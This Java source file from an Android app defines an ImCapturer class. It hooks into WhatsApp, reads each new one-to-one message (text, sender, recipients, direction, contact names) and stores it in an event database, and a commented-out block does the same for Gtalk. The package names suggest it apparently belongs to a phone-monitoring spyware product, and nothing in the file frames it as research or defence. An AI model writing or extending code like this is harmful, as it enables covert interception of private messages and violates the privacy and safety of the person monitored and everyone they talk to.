package com.fx.maind.capture;

import java.util.ArrayList;

import android.content.Context;

import com.fx.event.Event;
import com.fx.event.EventIm;
import com.fx.eventdb.EventDatabaseManager;
import com.fx.maind.ref.Customization;
import com.fx.maind.ref.MainDaemonResource;
import com.fx.util.FxResource;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.logger.FxLog;
import com.vvt.whatsapp.WhatsAppImData;
import com.vvt.whatsapp.WhatsAppObserver;
import com.vvt.whatsapp.WhatsAppObserverManager;

public class ImCapturer implements WhatsAppObserver.OnCaptureListenner {
	
	private static final String TAG = "ImCapturer";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private Context mContext;
	private EventDatabaseManager mEventDbManager;
	private WhatsAppObserverManager mWaObserver;
//	private GtalkObserver mGtalkObserver;
	
	public ImCapturer(Context context) {
		mContext = context;
		
		mEventDbManager = EventDatabaseManager.getInstance(mContext);
		
		mWaObserver = WhatsAppObserverManager.getWhatsAppObserverManager();
		mWaObserver.setLoggablePath(MainDaemonResource.LOG_FOLDER);
		mWaObserver.setDateFormat(FxResource.DATE_FORMAT);
		
//		mGtalkObserver = GtalkObserver.getGtalkObserver();
//		mGtalkObserver.setLoggablePath(MainDaemonResource.LOG_FOLDER);
//		mGtalkObserver.setDateFormat(FxResource.DATE_FORMAT);
	}
	
	public void registerObserver() {
		if (mWaObserver != null) mWaObserver.registerWhatsAppObserver(this);
//		if (mGtalkObserver != null) mGtalkObserver.registerGtalkObserver(this);
	}
	
	public void unregisterObserver() {
		if (mWaObserver != null) mWaObserver.unregisterWhatsAppObserver();
//		if (mGtalkObserver != null) mGtalkObserver.unregisterGtalkObserver(this);
	}
	
	@Override
	public void onReceiveNewWhatsAppMessages(ArrayList<WhatsAppImData> captureResults) {
		if (LOGV) FxLog.v(TAG, "onCapture # ENTER ...");
		
		EventIm im = null;
		ArrayList<String> contacts = null;
		
		for (WhatsAppImData data : captureResults) {
			if (data.isGroupChat()) continue;
			
			contacts = new ArrayList<String>();
			String contactName = null;
			
			for (String contact : data.getParticipantUids()) {
				contactName = ContactsDatabaseManager.getContactNameByPhone(contact);
				
				if (contactName == null || contactName.trim().length() < 1) {
					contacts.add(contact);
				}
				else {
					contacts.add(contactName);
				}
			}
			 
			String ownerName = data.getOwner();
			if (ownerName == null || ownerName.trim().length() < 1) {
				ownerName = data.getOwnerUid();
				if (ownerName == null) ownerName = "";
			}
			
			String speakerName = data.getSpeakName();
			
			if (speakerName == null || speakerName.trim().length() < 1) {
				String speakerUid = data.getSpeakerUid();
				if (speakerUid != null && speakerUid.trim().length() > 0) {
					speakerName = ContactsDatabaseManager.getContactNameByPhone(speakerUid);
					if (speakerName == null) {
						speakerName = speakerUid;
					}
				}
			}
			
			im = new EventIm(mContext, 
					data.getDateTime(), 
					data.isSent() ? Event.DIRECTION_OUT : Event.DIRECTION_IN, 
					Event.IM_WHATSAPP, 
					ownerName, 
					speakerName, 
					getStringArray(data.getParticipantUids()), 
					getStringArray(contacts), 
					data.getData());
			
			mEventDbManager.insert(im);
			if (LOGV) FxLog.v(TAG, String.format("onCapture # capture: %s", im));
		}
		
		if (LOGV) FxLog.v(TAG, "onCapture # EXIT ...");
	}

//	@Override
//	public void onReceiveNewGtalkMessages(ArrayList<GtalkData> captureResults) {
//		for (GtalkData data : captureResults) {
//			EventIm im = new EventIm(mContext, 
//					data.getDateTime(), 
//					data.isReceived() ? Event.DIRECTION_IN : Event.DIRECTION_OUT,  
//					Event.IM_GTALK, 
//					getDisplayString(data.getOwner(), data.getOwnerUid()), 
//					getDisplayString(data.getSpeakerName(), data.getSpeakerUid()), 
//					getStringArray(data.getParticipantUids()), 
//					getStringArray(data.getParticipantName()), 
//					data.getData());
//			
//			mEventDbManager.insert(im);
//			if (LOGV) FxLog.v(TAG, String.format("onCapture # capture: %s", im));
//		}
//	}
	
	@SuppressWarnings("unused")
	private String getDisplayString(String displayName, String id) {
		return displayName == null || displayName.trim().length() == 0 ? id : displayName;
	}
	
	private String[] getStringArray(ArrayList<String> stringList) {
		String[] output = null;
		if (stringList != null) {
			output = new String[stringList.size()];
			stringList.toArray(output);
		}
		return output;
	}

}
